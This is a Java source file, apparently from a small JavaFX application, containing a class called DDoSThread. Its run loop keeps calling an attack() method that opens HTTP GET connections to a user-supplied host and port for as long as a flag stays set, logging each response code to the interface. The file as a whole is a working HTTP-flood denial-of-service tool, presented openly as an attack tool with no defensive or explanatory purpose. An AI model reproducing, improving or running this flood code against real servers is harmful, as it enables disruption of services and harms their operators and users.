package sample;

import javafx.application.Platform;
import javafx.collections.ObservableList;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.atomic.AtomicBoolean;

public class DDoSThread extends Thread {
    public AtomicBoolean running;
    private final URL url;
    ObservableList<String> list;

    String param;

    public DDoSThread(String url, String port, ObservableList<String> list, AtomicBoolean running) throws Exception {
        // create new url from the input fields
        String request = url + port;
        this.url = new URL(request);
        this.list = list;
        this.running = running;
        param = "param1=" + URLEncoder.encode("87845", "UTF-8");
    }


    @Override
    public void run() {
        // running.get()) boolean value to start and stop the thread
        while (running.get()) {
            try {
                // if no exception start attack
                attack();
            } catch (Exception e) {
                System.out.println("Error: " + e.getMessage());
                // add error message to the logger on the UI
                Platform.runLater(() -> {
                    list.add("Error: " + e.getMessage());
                });
            }
        }
    }

    public void attack() {
        // create an http connection
        HttpURLConnection connection;
        try {
            connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setRequestMethod("GET");
            String message = Thread.currentThread().getName() + " " + connection.getResponseCode();
            System.out.println(message);
            //add response form the server to the logger
            Platform.runLater(() -> {
                list.add(message);
            });
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
